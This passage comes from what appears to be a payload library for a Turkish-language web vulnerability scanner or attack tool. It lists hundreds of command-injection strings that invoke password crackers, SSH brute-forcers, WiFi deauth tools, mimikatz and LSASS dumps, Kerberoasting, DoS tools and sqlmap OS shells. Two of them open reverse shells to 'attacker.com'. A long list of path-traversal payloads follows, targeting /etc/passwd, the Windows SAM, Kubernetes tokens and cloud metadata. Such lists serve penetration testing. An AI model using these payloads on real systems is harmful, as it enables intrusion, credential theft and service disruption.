{"payload": "; sleuthkit fls -r /dev/sda1", "guven": 0.8, "aciklama": "Sleuth Kit file listing"},
{"payload": "; autopsy", "guven": 0.8, "aciklama": "Autopsy forensic analysis"},
{"payload": "; volatility -f /tmp/memory.dump imageinfo", "guven": 0.85, "aciklama": "Memory dump analysis"},
{"payload": "; bulk_extractor -o /tmp/output /dev/sda", "guven": 0.8, "aciklama": "Bulk extractor"},
{"payload": "; affcat /tmp/image.aff | strings", "guven": 0.8, "aciklama": "AFF image strings"},
{"payload": "; ewfinfo /tmp/image.E01", "guven": 0.8, "aciklama": "EWF image info"},
{"payload": "; mmls /dev/sda", "guven": 0.8, "aciklama": "Media management list"},
{"payload": "; fsstat /dev/sda1", "guven": 0.8, "aciklama": "Filesystem statistics"},
{"payload": "; istat /dev/sda1 2", "guven": 0.8, "aciklama": "Inode statistics"},
{"payload": "; ils /dev/sda1", "guven": 0.8, "aciklama": "Inode listing"},
{"payload": "; icat /dev/sda1 2", "guven": 0.8, "aciklama": "Inode content display"},
{"payload": "; ifind /dev/sda1 -n /etc/passwd", "guven": 0.8, "aciklama": "Inode find by name"},
{"payload": "; ffind /dev/sda1 2", "guven": 0.8, "aciklama": "File find by inode"},
{"payload": "; blkls /dev/sda1", "guven": 0.8, "aciklama": "Block listing"},
{"payload": "; blkcat /dev/sda1 100", "guven": 0.8, "aciklama": "Block content display"},
{"payload": "; blkstat /dev/sda1 100", "guven": 0.8, "aciklama": "Block statistics"},
{"payload": "; blkcalc /dev/sda1 100", "guven": 0.8, "aciklama": "Block calculator"},

# Cryptographic Attacks (401-450)
{"payload": "; hashcat -m 0 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt", "guven": 0.9, "aciklama": "Hashcat MD5 cracking"},
{"payload": "; john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/shadow", "guven": 0.9, "aciklama": "John shadow cracking"},
{"payload": "; hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target", "guven": 0.9, "aciklama": "Hydra SSH brute force"},
{"payload": "; medusa -h target -u admin -P /usr/share/wordlists/rockyou.txt -M ssh", "guven": 0.85, "aciklama": "Medusa SSH attack"},
{"payload": "; ncrack -p 22 --user admin -P /usr/share/wordlists/rockyou.txt target", "guven": 0.85, "aciklama": "Ncrack SSH brute"},
{"payload": "; patator ssh_login host=target user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt", "guven": 0.85, "aciklama": "Patator SSH brute"},
{"payload": "; crowbar -b ssh -s target/32 -u admin -C /usr/share/wordlists/rockyou.txt", "guven": 0.8, "aciklama": "Crowbar SSH brute"},
{"payload": "; thc-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target", "guven": 0.85, "aciklama": "THC Hydra FTP"},
{"payload": "; brutespray -f nmap.gnmap -t 50 -T 4", "guven": 0.8, "aciklama": "Brutespray automated"},
{"payload": "; crunch 8 8 -t @@@@@@%% | aircrack-ng -w - capture.cap", "guven": 0.85, "acklama": "Crunch WiFi crack"},
{"payload": "; aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap", "guven": 0.85, "aciklama": "Aircrack-ng WPA"},
{"payload": "; hashcat -m 2500 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt", "guven": 0.9, "aciklama": "Hashcat WPA2 crack"},
{"payload": "; wifite --wpa --dict /usr/share/wordlists/rockyou.txt", "guven": 0.85, "aciklama": "Wifite automated attack"},
{"payload": "; reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6", "guven": 0.85, "aciklama": "Reaver WPS attack"},
{"payload": "; bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0", "guven": 0.8, "aciklama": "Bully WPS attack"},
{"payload": "; pixiewps -e hash1 -r hash2 -s hash3 -z hash4 -a hash5 -n hash6", "guven": 0.85, "aciklama": "Pixie dust WPS"},
{"payload": "; wash -i wlan0", "guven": 0.8, "aciklama": "WPS network scan"},
{"payload": "; airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0", "guven": 0.8, "aciklama": "Airodump capture"},
{"payload": "; aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0", "guven": 0.85, "aciklama": "Deauth attack"},
{"payload": "; mdk3 wlan0 d -b blacklist.txt", "guven": 0.8, "aciklama": "MDK3 deauth flood"},
{"payload": "; mdk4 wlan0 d -B blacklist.txt", "guven": 0.8, "aciklama": "MDK4 deauth attack"},
{"payload": "; wifijammer -i wlan0", "guven": 0.8, "aciklama": "WiFi jammer"},
{"payload": "; hostapd-wpe hostapd-wpe.conf", "guven": 0.85, "aciklama": "Evil twin AP"},
{"payload": "; dnsmasq -C dnsmasq.conf", "guven": 0.8, "aciklama": "DNS spoofing"},
{"payload": "; ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//", "guven": 0.85, "aciklama": "ARP poisoning"},
{"payload": "; arpspoof -i eth0 -t 192.168.1.100 192.168.1.1", "guven": 0.85, "aciklama": "ARP spoofing"},
{"payload": "; bettercap -iface eth0", "guven": 0.85, "aciklama": "Bettercap MITM"},
{"payload": "; responder -I eth0 -wrf", "guven": 0.9, "aciklama": "Responder LLMNR"},
{"payload": "; impacket-ntlmrelayx -t smb://target", "guven": 0.9, "aciklama": "NTLM relay attack"},
{"payload": "; evil-winrm -i target -u admin -H hash", "guven": 0.9, "aciklama": "WinRM pass-the-hash"},
{"payload": "; psexec.py domain/user:password@target", "guven": 0.9, "aciklama": "PSExec lateral movement"},
{"payload": "; wmiexec.py domain/user:password@target", "guven": 0.9, "aciklama": "WMI execution"},
{"payload": "; dcomexec.py domain/user:password@target", "guven": 0.9, "aciklama": "DCOM execution"},
{"payload": "; atexec.py domain/user:password@target 'whoami'", "guven": 0.85, "aciklama": "Task scheduler exec"},
{"payload": "; smbexec.py domain/user:password@target", "guven": 0.9, "aciklama": "SMB execution"},
{"payload": "; secretsdump.py domain/user:password@target", "guven": 0.95, "aciklama": "Secrets dump"},
{"payload": "; mimikatz 'sekurlsa::logonpasswords' exit", "guven": 0.95, "aciklama": "Mimikatz passwords"},
{"payload": "; procdump -ma lsass.exe lsass.dmp", "guven": 0.9, "aciklama": "LSASS dump"},
{"payload": "; pypykatz lsa minidump lsass.dmp", "guven": 0.9, "aciklama": "Pypykatz LSASS"},
{"payload": "; lsassy -d domain -u user -p password target", "guven": 0.9, "aciklama": "Lsassy remote dump"},
{"payload": "; crackmapexec smb target -u user -p password --sam", "guven": 0.9, "aciklama": "CrackMapExec SAM"},
{"payload": "; crackmapexec smb target -u user -p password --lsa", "guven": 0.9, "aciklama": "CrackMapExec LSA"},
{"payload": "; crackmapexec smb target -u user -p password --ntds", "guven": 0.95, "aciklama": "CrackMapExec NTDS"},
{"payload": "; bloodhound-python -d domain -u user -p password -gc dc.domain.com -c all", "guven": 0.85, "aciklama": "BloodHound collection"},
{"payload": "; ldapdomaindump -u 'domain\\user' -p password ldap://dc.domain.com", "guven": 0.85, "aciklama": "LDAP domain dump"},
{"payload": "; kerbrute userenum --dc dc.domain.com -d domain users.txt", "guven": 0.8, "aciklama": "Kerberos user enum"},
{"payload": "; GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt", "guven": 0.9, "aciklama": "ASREPRoast attack"},
{"payload": "; GetUserSPNs.py domain/user:password -outputfile hashes.txt", "guven": 0.9, "aciklama": "Kerberoast attack"},
{"payload": "; rubeus asreproast /format:hashcat /outfile:hashes.txt", "guven": 0.9, "aciklama": "Rubeus ASREPRoast"},
{"payload": "; rubeus kerberoast /format:hashcat /outfile:hashes.txt", "guven": 0.9, "aciklama": "Rubeus Kerberoast"},
{"payload": "; impacket-goldenPac -dc-ip dc.domain.com domain/user:password@target", "guven": 0.95, "aciklama": "MS14-068 exploit"},
{"payload": "; zerologon-scan target", "guven": 0.95, "aciklama": "Zerologon scan"},
{"payload": "; petitpotam.py listener target", "guven": 0.9, "aciklama": "PetitPotam attack"},
{"payload": "; printerbug.py domain/user:password@target listener", "guven": 0.9, "aciklama": "PrinterBug attack"},

# Advanced Network Attacks (451-500)
{"payload": "; nmap -sS -sV -O -A target", "guven": 0.85, "aciklama": "Comprehensive nmap scan"},
{"payload": "; masscan -p1-65535 --rate=1000 target", "guven": 0.85, "aciklama": "Masscan port scan"},
{"payload": "; zmap -p 80 0.0.0.0/0", "guven": 0.8, "aciklama": "Internet-wide scan"},
{"payload": "; unicornscan -mT target:1-65535", "guven": 0.8, "aciklama": "Unicornscan TCP"},
{"payload": "; hping3 -S -p 80 -c 5 target", "guven": 0.8, "aciklama": "Hping3 SYN flood"},
{"payload": "; scapy -c 'send(IP(dst=\"target\")/TCP(dport=80,flags=\"S\"),count=100)'", "guven": 0.85, "aciklama": "Scapy packet crafting"},
{"payload": "; nemesis tcp -S 192.168.1.100 -D target -fP -s 12345 -d 80", "guven": 0.8, "aciklama": "Nemesis TCP injection"},
{"payload": "; packeth", "guven": 0.75, "aciklama": "Packeth GUI crafting"},
{"payload": "; ostinato", "guven": 0.75, "aciklama": "Ostinato traffic generator"},
{"payload": "; t50 --flood -S target -p 80", "guven": 0.8, "aciklama": "T50 packet injector"},
{"payload": "; siege -c 100 -t 60s http://target", "guven": 0.8, "aciklama": "Siege load testing"},
{"payload": "; slowhttptest -c 1000 -H -g -o slow_headers -i 10 -r 200 -t GET -u http://target", "guven": 0.85, "aciklama": "Slow HTTP attack"},
{"payload": "; slowloris -dns target -port 80 -timeout 10 -sockets 200", "guven": 0.85, "aciklama": "Slowloris attack"},
{"payload": "; goldeneye http://target -w 100 -s 1000", "guven": 0.85, "aciklama": "GoldenEye DoS"},
{"payload": "; hulk http://target", "guven": 0.8, "aciklama": "HULK DoS attack"},
{"payload": "; xerxes target 80", "guven": 0.8, "aciklama": "Xerxes DoS tool"},
{"payload": "; ddosim -d target -p 80 -i eth0 -c 1000", "guven": 0.85, "aciklama": "DDoSIM simulator"},
{"payload": "; mz eth0 -A 192.168.1.100 -B target -t tcp 'dp=80,sp=12345,flags=syn' -c 0", "guven": 0.85, "aciklama": "Mausezahn crafting"},
{"payload": "; blast target 80 1000", "guven": 0.8, "aciklama": "Blast stress tester"},
{"payload": "; thc-ssl-dos target 443", "guven": 0.85, "aciklama": "SSL DoS attack"},
{"payload": "; dirb http://target /usr/share/wordlists/dirb/common.txt", "guven": 0.8, "aciklama": "Directory bruteforce"},
{"payload": "; dirbuster -H -u http://target -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "guven": 0.8, "aciklama": "DirBuster GUI"},
{"payload": "; gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt", "guven": 0.8, "aciklama": "Gobuster directory"},
{"payload": "; ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ", "guven": 0.8, "aciklama": "FFUF fuzzing"},
{"payload": "; wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target/FUZZ", "guven": 0.8, "aciklama": "Wfuzz web fuzzer"},
{"payload": "; feroxbuster -u http://target -w /usr/share/wordlists/dirb/common.txt", "guven": 0.8, "aciklama": "Feroxbuster scanner"},
{"payload": "; whatweb http://target", "guven": 0.75, "aciklama": "WhatWeb fingerprint"},
{"payload": "; wafw00f http://target", "guven": 0.8, "aciklama": "WAF detection"},
{"payload": "; nikto -h target", "guven": 0.8, "aciklama": "Nikto web scanner"},
{"payload": "; skipfish -o results http://target", "guven": 0.8, "aciklama": "Skipfish scanner"},
{"payload": "; w3af_console", "guven": 0.8, "aciklama": "W3AF web scanner"},
{"payload": "; zaproxy -quickurl http://target", "guven": 0.8, "aciklama": "OWASP ZAP scanner"},
{"payload": "; burpsuite", "guven": 0.85, "aciklama": "Burp Suite proxy"},
{"payload": "; sqlmap -u 'http://target/page.php?id=1' --dbs", "guven": 0.9, "aciklama": "SQLMap database enum"},
{"payload": "; sqlmap -u 'http://target/page.php?id=1' --dump", "guven": 0.95, "aciklama": "SQLMap data dump"},
{"payload": "; sqlmap -u 'http://target/page.php?id=1' --os-shell", "guven": 0.95, "aciklama": "SQLMap OS shell"},
{"payload": "; sqlmap -u 'http://target/page.php?id=1' --file-read=/etc/passwd", "guven": 0.9, "aciklama": "SQLMap file read"},
{"payload": "; commix -u 'http://target/page.php?cmd=test'", "guven": 0.9, "aciklama": "Commix command injection"},
{"payload": "; xsser -u 'http://target/search.php?q=XSS' --auto", "guven": 0.85, "aciklama": "XSSer XSS scanner"},
{"payload": "; beef-xss", "guven": 0.85, "aciklama": "BeEF XSS framework"},
{"payload": "; xsstrike -u http://target", "guven": 0.8, "aciklama": "XSStrike scanner"},
{"payload": "; dalfox url http://target", "guven": 0.8, "aciklama": "Dalfox XSS scanner"},
{"payload": "; nosqlmap -u http://target --detect", "guven": 0.85, "aciklama": "NoSQL injection"},
{"payload": "; ldapinjection -u http://target/login.php", "guven": 0.8, "aciklama": "LDAP injection"},
{"payload": "; xpathinjection -u http://target/search.php", "guven": 0.8, "aciklama": "XPath injection"},
{"payload": "; xxeinjector -r request.txt --enumerate", "guven": 0.85, "aciklama": "XXE injection"},
{"payload": "; ysoserial URLDNS 'http://burpcollaborator.net' > payload.ser", "guven": 0.9, "aciklama": "Java deserialization"},
{"payload": "; marshalsec -gadget CommonsCollections6 -args 'nc attacker.com 4444 -e /bin/sh'", "guven": 0.9, "aciklama": "Java gadget chain"},
{"payload": "; phpggc Guzzle/FW1 system 'nc attacker.com 4444 -e /bin/sh'", "guven": 0.9, "aciklama": "PHP gadget chain"},
{"payload": "; viewstate /wEPDwUKM... --decode", "guven": 0.8, "aciklama": "ViewState decoder"},
{"payload": "; jwt_tool eyJ0eXAiOiJKV1... -C -d wordlist.txt", "guven": 0.85, "aciklama": "JWT cracking"},
{"payload": "; padding-oracle-attacker -u http://target/decrypt -c cookie", "guven": 0.85, "aciklama": "Padding oracle"},
{"payload": "; cbc-padding-oracle http://target/decrypt cookie", "guven": 0.85, "aciklama": "CBC padding oracle"},
{"payload": "; bleichenbacher-attack target 443", "guven": 0.8, "aciklama": "Bleichenbacher attack"}
            
            ],
            
                ZafiyetTipi.LFI: [
                 # 1-50: Temel ve Derin Directory Traversal
                {"payload": "../../../etc/passwd", "guven": 0.95, "aciklama": "Linux şifre dosyası"},
                {"payload": "../../../../../../../../etc/passwd", "guven": 0.92, "aciklama": "Derin dizin gezintisi"},
                {"payload": "../../../../../../../../../../../etc/passwd", "guven": 0.90, "aciklama": "Ultra derin traversal"},
                {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "guven": 0.95, "aciklama": "Windows hosts dosyası"},
                {"payload": "/etc/passwd", "guven": 0.90, "aciklama": "Direkt passwd dosyası"},
                {"payload": "....//....//....//etc/passwd", "guven": 0.85, "aciklama": "Çift slash bypass"},
                {"payload": "..././..././..././etc/passwd", "guven": 0.87, "aciklama": "Dot slash kombinasyonu"},
                {"payload": ".././.././.././etc/passwd", "guven": 0.86, "aciklama": "Alternatif dot bypass"},
                {"payload": "...//...//...//etc/passwd", "guven": 0.84, "aciklama": "Triple dot bypass"},
                {"payload": "..../..../..../etc/passwd", "guven": 0.83, "aciklama": "Quad dot bypass"},

                # 11-20: URL Encoding Variations
                {"payload": "..%2F..%2F..%2Fetc%2Fpasswd", "guven": 0.88, "aciklama": "URL kodlaması"},
                {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "guven": 0.85, "aciklama": "Tam URL kodlaması"},
                {"payload": "..%252f..%252f..%252fetc%252fpasswd", "guven": 0.82, "aciklama": "Çift URL kodlaması"},
                {"payload": "%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd", "guven": 0.80, "aciklama": "Karışık encoding"},
                {"payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "guven": 0.78, "aciklama": "Unicode overlong encoding"},
                {"payload": "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd", "guven": 0.76, "aciklama": "UTF-8 overlong"},
                {"payload": "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd", "guven": 0.75, "aciklama": "Alternatif unicode bypass"},
                {"payload": "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd", "guven": 0.77, "aciklama": "Unicode slash encoding"},
                {"payload": "..%u2216..%u2216..%u2216etc%u2216passwd", "guven": 0.74, "aciklama": "Unicode backslash"},
                {"payload": "..%5c..%5c..%5cetc%5cpasswd", "guven": 0.79, "aciklama": "Backslash encoding"},

                # 21-30: Null Byte Injection
                {"payload": "../../../etc/passwd%00", "guven": 0.85, "aciklama": "Null byte sonlandırma"},
                {"payload": "../../../etc/passwd%00.jpg", "guven": 0.84, "aciklama": "Null byte ile uzantı bypass"},
                {"payload": "../../../etc/passwd%00.txt", "guven": 0.83, "aciklama": "Null byte txt bypass"},
                {"payload": "../../../etc/passwd%00.php", "guven": 0.82, "aciklama": "Null byte php bypass"},
                {"payload": "../../../etc/passwd%00.html", "guven": 0.81, "aciklama": "Null byte html bypass"},
                {"payload": "../../../etc/passwd%00%00", "guven": 0.80, "aciklama": "Çift null byte"},
                {"payload": "../../../etc/passwd%0000", "guven": 0.79, "aciklama": "Extended null byte"},
                {"payload": "../../../etc/passwd\x00", "guven": 0.78, "aciklama": "Hex null byte"},
                {"payload": "../../../etc/passwd\\0", "guven": 0.77, "aciklama": "Escaped null byte"},
                {"payload": "../../../etc/passwd%00%20", "guven": 0.76, "aciklama": "Null byte + space"},

                # 31-40: Filter Evasion
                {"payload": "php://filter/read=convert.base64-encode/resource=../../../etc/passwd", "guven": 0.92, "aciklama": "PHP filter base64"},
                {"payload": "php://filter/convert.base64-encode/resource=../../../etc/passwd", "guven": 0.91, "aciklama": "Kısa PHP filter"},
                {"payload": "php://filter/read=string.rot13/resource=../../../etc/passwd", "guven": 0.89, "aciklama": "ROT13 filter"},
                {"payload": "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd", "guven": 0.87, "aciklama": "Iconv filter"},
                {"payload": "php://filter/read=convert.quoted-printable-encode/resource=../../../etc/passwd", "guven": 0.86, "aciklama": "Quoted printable"},
                {"payload": "php://filter/read=convert.iconv.utf-8.utf-7/resource=../../../etc/passwd", "guven": 0.85, "aciklama": "UTF-7 conversion"},
                {"payload": "php://filter/zlib.deflate/convert.base64-encode/resource=../../../etc/passwd", "guven": 0.84, "aciklama": "Zlib compression"},
                {"payload": "php://filter/bzip2.compress/convert.base64-encode/resource=../../../etc/passwd", "guven": 0.83, "aciklama": "Bzip2 compression"},
                {"payload": "php://filter/read=string.strip_tags/resource=../../../etc/passwd", "guven": 0.82, "aciklama": "Strip tags filter"},
                {"payload": "php://filter/convert.iconv.utf-8.utf-32/resource=../../../etc/passwd", "guven": 0.81, "aciklama": "UTF-32 conversion"},

                # 41-50: Data URI Schemes
                {"payload": "data://text/plain;base64,Li4vLi4vLi4vZXRjL3Bhc3N3ZA==", "guven": 0.88, "aciklama": "Data URI base64"},
                {"payload": "data:text/plain,../../../etc/passwd", "guven": 0.87, "aciklama": "Data URI plain"},
                {"payload": "file:///etc/passwd", "guven": 0.86, "aciklama": "File URI scheme"},
                {"payload": "expect://id", "guven": 0.85, "aciklama": "Expect wrapper"},
                {"payload": "php://input", "guven": 0.89, "aciklama": "PHP input stream"},
                {"payload": "php://stdin", "guven": 0.84, "aciklama": "PHP stdin"},
                {"payload": "php://memory", "guven": 0.83, "aciklama": "PHP memory"},
                {"payload": "php://temp", "guven": 0.82, "aciklama": "PHP temp"},
                {"payload": "php://output", "guven": 0.81, "aciklama": "PHP output"},
                {"payload": "php://fd/0", "guven": 0.80, "aciklama": "PHP file descriptor"},

                # 51-60: Log Poisoning Targets
                {"payload": "../../../var/log/apache2/access.log", "guven": 0.90, "aciklama": "Apache access log"},
                {"payload": "../../../var/log/apache2/error.log", "guven": 0.89, "aciklama": "Apache error log"},
                {"payload": "../../../var/log/nginx/access.log", "guven": 0.88, "aciklama": "Nginx access log"},
                {"payload": "../../../var/log/nginx/error.log", "guven": 0.87, "aciklama": "Nginx error log"},
                {"payload": "../../../var/log/httpd/access_log", "guven": 0.86, "aciklama": "HTTPD access log"},
                {"payload": "../../../var/log/httpd/error_log", "guven": 0.85, "aciklama": "HTTPD error log"},
                {"payload": "../../../var/log/auth.log", "guven": 0.84, "aciklama": "Auth log"},
                {"payload": "../../../var/log/syslog", "guven": 0.83, "aciklama": "System log"},
                {"payload": "../../../var/log/messages", "guven": 0.82, "aciklama": "System messages"},
                {"payload": "../../../var/log/kern.log", "guven": 0.81, "aciklama": "Kernel log"},

                # 61-70: Proc Filesystem
                {"payload": "../../../proc/self/environ", "guven": 0.92, "aciklama": "Process environment"},
                {"payload": "../../../proc/version", "guven": 0.90, "aciklama": "Kernel version info"},
                {"payload": "../../../proc/cmdline", "guven": 0.89, "aciklama": "Kernel command line"},
                {"payload": "../../../proc/self/stat", "guven": 0.88, "aciklama": "Process statistics"},
                {"payload": "../../../proc/self/status", "guven": 0.87, "aciklama": "Process status"},
                {"payload": "../../../proc/self/fd/0", "guven": 0.86, "aciklama": "File descriptor 0"},
                {"payload": "../../../proc/self/fd/1", "guven": 0.85, "aciklama": "File descriptor 1"},
                {"payload": "../../../proc/self/fd/2", "guven": 0.84, "aciklama": "File descriptor 2"},
                {"payload": "../../../proc/self/maps", "guven": 0.83, "aciklama": "Memory mappings"},
                {"payload": "../../../proc/self/mem", "guven": 0.82, "aciklama": "Process memory"},

                # 71-80: Session and Temp Files
                {"payload": "../../../tmp/sess_PHPSESSID", "guven": 0.85, "aciklama": "PHP session file"},
                {"payload": "../../../var/lib/php/sessions/sess_PHPSESSID", "guven": 0.84, "aciklama": "PHP session path"},
                {"payload": "../../../tmp/phpyh4f5R", "guven": 0.75, "aciklama": "Temp PHP file"},
                {"payload": "../../../var/tmp/phpyh4f5R", "guven": 0.74, "aciklama": "Var temp PHP file"},
                {"payload": "../../../tmp/.tmpfile", "guven": 0.73, "aciklama": "Hidden temp file"},
                {"payload": "../../../var/cache/apache2/mod_cache", "guven": 0.72, "aciklama": "Apache cache"},
                {"payload": "../../../var/spool/cron/crontabs/root", "guven": 0.83, "aciklama": "Root crontab"},
                {"payload": "../../../var/spool/mail/root", "guven": 0.82, "aciklama": "Root mail spool"},
                {"payload": "../../../var/run/secrets/kubernetes.io/serviceaccount/token", "guven": 0.88, "aciklama": "Kubernetes token"},
                {"payload": "../../../run/secrets/kubernetes.io/serviceaccount/ca.crt", "guven": 0.87, "aciklama": "Kubernetes CA cert"},

                # 81-90: Cloud Metadata
                {"payload": "http://169.254.169.254/latest/meta-data/", "guven": 0.90, "aciklama": "AWS metadata"},
                {"payload": "http://metadata.google.internal/computeMetadata/v1/", "guven": 0.89, "aciklama": "GCP metadata"},
                {"payload": "http://169.254.169.254/metadata/instance", "guven": 0.88, "aciklama": "Azure metadata"},
                {"payload": "http://100.100.100.200/latest/meta-data/", "guven": 0.87, "aciklama": "Alibaba metadata"},
                {"payload": "file:///proc/net/arp", "guven": 0.86, "aciklama": "Network ARP table"},
                {"payload": "file:///proc/net/route", "guven": 0.85, "aciklama": "Network routing"},
                {"payload": "file:///proc/net/fib_trie", "guven": 0.84, "aciklama": "Network FIB trie"},
                {"payload": "file:///proc/net/tcp", "guven": 0.83, "aciklama": "TCP connections"},
                {"payload": "file:///proc/net/udp", "guven": 0.82, "aciklama": "UDP connections"},
                {"payload": "file:///sys/class/net/eth0/address", "guven": 0.81, "aciklama": "Network interface MAC"},

                # 91-100: Application Specific
                {"payload": "../../../etc/mysql/my.cnf", "guven": 0.88, "aciklama": "MySQL config"},
                {"payload": "../../../etc/apache2/apache2.conf", "guven": 0.87, "aciklama": "Apache main config"},
                {"payload": "../../../etc/nginx/nginx.conf", "guven": 0.86, "aciklama": "Nginx config"},
                {"payload": "../../../etc/php/7.4/apache2/php.ini", "guven": 0.85, "aciklama": "PHP 7.4 config"},
                {"payload": "../../../etc/ssh/sshd_config", "guven": 0.84, "aciklama": "SSH daemon config"},
                {"payload": "../../../etc/postfix/main.cf", "guven": 0.83, "aciklama": "Postfix config"},
                {"payload": "../../../etc/vsftpd.conf", "guven": 0.82, "aciklama": "VSFTPD config"},
                {"payload": "../../../etc/redis/redis.conf", "guven": 0.81, "aciklama": "Redis config"},
                {"payload": "../../../etc/mongodb.conf", "guven": 0.80, "aciklama": "MongoDB config"},
                {"payload": "../../../etc/elasticsearch/elasticsearch.yml", "guven": 0.79, "aciklama": "Elasticsearch config"},

                # 101-110: Windows System Files
                {"payload": "..\\..\\..\\windows\\system32\\config\\sam", "guven": 0.95, "aciklama": "Windows SAM database"},
                {"payload": "..\\..\\..\\windows\\system32\\config\\system", "guven": 0.94, "aciklama": "Windows system registry"},
                {"payload": "..\\..\\..\\windows\\system32\\config\\software", "guven": 0.93, "aciklama": "Windows software registry"},
                {"payload": "..\\..\\..\\windows\\repair\\sam", "guven": 0.92, "aciklama": "Windows backup SAM"},
                {"payload": "..\\..\\..\\windows\\repair\\system", "guven": 0.91, "aciklama": "Windows backup system"},
                {"payload": "..\\..\\..\\boot.ini", "guven": 0.90, "aciklama": "Windows boot config"},
                {"payload": "..\\..\\..\\windows\\win.ini", "guven": 0.89, "aciklama": "Windows initialization"},
                {"payload": "..\\..\\..\\windows\\system.ini", "guven": 0.88, "aciklama": "Windows system ini"},
                {"payload": "..\\..\\..\\windows\\panther\\unattend.xml", "guven": 0.87, "aciklama": "Windows unattend"},
                {"payload": "..\\..\\..\\windows\\debug\\netsetup.log", "guven": 0.86, "aciklama": "Windows network setup log"},

                # 111-120: Advanced Encoding
                {"payload": "..%u002f..%u002f..%u002fetc%u002fpasswd", "guven": 0.75, "aciklama": "Unicode UTF-16 encoding"},
                {"payload": "..%u005c..%u005c..%u005cetc%u005cpasswd", "guven": 0.74, "aciklama": "Unicode backslash UTF-16"},
                {"payload": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd", "guven": 0.73, "aciklama": "JavaScript unicode"},
                {"payload": "..&#x2f;..&#x2f;..&#x2f;etc&#x2f;passwd", "guven": 0.72, "aciklama": "HTML entity hex"},
                {"payload": "..&#47;..&#47;..&#47;etc&#47;passwd", "guven": 0.71, "aciklama": "HTML entity decimal"},
                {"payload": "..%uff0f..%uff0f..%uff0fetc%uff0fpasswd", "guven": 0.70, "aciklama": "Fullwidth unicode"},
                {"payload": "..%u2044..%u2044..%u2044etc%u2044passwd", "guven": 0.69, "aciklama": "Fraction slash unicode"},
                {"payload": "..%u2215..%u2215..%u2215etc%u2215passwd", "guven": 0.68, "aciklama": "Division slash unicode"},
                {"payload": "..\\x2f..\\x2f..\\x2fetc\\x2fpasswd", "guven": 0.67, "aciklama": "Hex escaped slash"},
                {"payload": "..\\056\\056/..\\056\\056/..\\056\\056/etc/passwd", "guven": 0.66, "aciklama": "Octal dot encoding"},

                # 121-130: Path Confusion
                {"payload": "/var/www/html/../../../etc/passwd", "guven": 0.85, "aciklama": "Webroot traversal"},
                {"payload": "/usr/share/nginx/html/../../../etc/passwd", "guven": 0.84, "aciklama": "Nginx root traversal"},
                {"payload": "/var/www/../../../etc/passwd", "guven": 0.83, "aciklama": "Short webroot traversal"},
                {"payload": "./../../etc/passwd", "guven": 0.82, "aciklama": "Current dir traversal"},
                {"payload": "~/../../etc/passwd", "guven": 0.81, "aciklama": "Home dir traversal"},
                {"payload": "/tmp/../../../etc/passwd", "guven": 0.80, "aciklama": "Tmp dir traversal"},
                {"payload": "/opt/../../../etc/passwd", "guven": 0.79, "aciklama": "Opt dir traversal"},
                {"payload": "/usr/../../../etc/passwd", "guven": 0.78, "aciklama": "Usr dir traversal"},
                {"payload": "/home/../../../etc/passwd", "guven": 0.77, "aciklama": "Home absolute traversal"},
                {"payload": "/root/../../../etc/passwd", "guven": 0.76, "aciklama": "Root dir traversal"},

                # 131-140: File Inclusion with Parameters
                {"payload": "../../../etc/passwd?", "guven": 0.75, "aciklama": "Query parameter append"},
                {"payload": "../../../etc/passwd#", "guven": 0.74, "aciklama": "Fragment append"},
                {"payload": "../../../etc/passwd&", "guven": 0.73, "aciklama": "Parameter separator"},
                {"payload": "../../../etc/passwd%23", "guven": 0.72, "aciklama": "URL encoded fragment"},
                {"payload": "../../../etc/passwd%3f", "guven": 0.71, "aciklama": "URL encoded query"},
                {"payload": "../../../etc/passwd%26", "guven": 0.70, "aciklama": "URL encoded ampersand"},
                {"payload": "../../../etc/passwd;", "guven": 0.69, "aciklama": "Semicolon append"},
                {"payload": "../../../etc/passwd%3b", "guven": 0.68, "aciklama": "URL encoded semicolon"},
                {"payload": "../../../etc/passwd|", "guven": 0.67, "aciklama": "Pipe character"},
                {"payload": "../../../etc/passwd%7c", "guven": 0.66, "aciklama": "URL encoded pipe"},

                # 141-150: Case Variations
                {"payload": "../../../ETC/PASSWD", "guven": 0.65, "aciklama": "Uppercase path"},
                {"payload": "../../../Etc/Passwd", "guven": 0.64, "aciklama": "Mixed case path"},
                {"payload": "../../../eTc/pAsSwD", "guven": 0.63, "aciklama": "Random case mix"},
                {"payload": "../../../EtC/PaSsWd", "guven": 0.62, "aciklama": "Alternating case"},
                {"payload": "../../../etc/PASSWD", "guven": 0.61, "aciklama": "Uppercase filename"},
                {"payload": "../../../ETC/passwd", "guven": 0.60, "aciklama": "Uppercase directory"},
                {"payload": "..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts", "guven": 0.75, "aciklama": "Windows uppercase"},
                {"payload": "..\\..\\..\\Windows\\System32\\Drivers\\Etc\\Hosts", "guven": 0.74, "aciklama": "Windows mixed case"},
                {"payload": "..\\..\\..\\windows\\SYSTEM32\\drivers\\ETC\\hosts", "guven": 0.73, "aciklama": "Windows random case"},
